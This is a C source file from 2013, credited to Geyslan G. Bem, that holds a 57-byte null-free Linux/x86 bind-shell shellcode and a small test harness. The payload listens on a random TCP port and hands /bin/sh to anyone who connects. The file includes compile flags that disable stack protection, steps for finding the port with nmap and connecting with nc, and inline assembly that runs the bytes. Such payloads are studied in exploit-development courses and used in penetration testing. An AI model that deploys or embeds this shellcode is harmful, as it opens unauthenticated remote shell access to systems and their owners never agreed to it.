/*

 Tiny Shell Bind TCP Random Port Shellcode - C Language - Linux/x86
 Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/


/*

   tiny_shell_bind_tcp_random_port_shellcode

   * 57 bytes
   * null-free


   # gcc -m32 -fno-stack-protector -z execstack tiny_shell_bind_tcp_random_port_shellcode.c -o tiny_shell_bind_tcp_random_port_shellcode

   Testing
   # ./tiny_shell_bind_tcp_random_port_shellcode
   # netstat -anp | grep shell
   # nmap -sS 127.0.0.1 -p-  (It's necessary to use the TCP SYN scan option [-sS]; thus avoids that nmap connects to the port open by shellcode)
   # nc 127.0.0.1 port

*/


#include <stdio.h>
#include <string.h>

unsigned char code[] = \

"\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a"
"\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0"
"\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80"
"\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8"
"\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\x41\xcd\x80";

main ()
{

        // When contains null bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(code));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp\n\t"

	// Calling the shellcode
		 "call code");

}
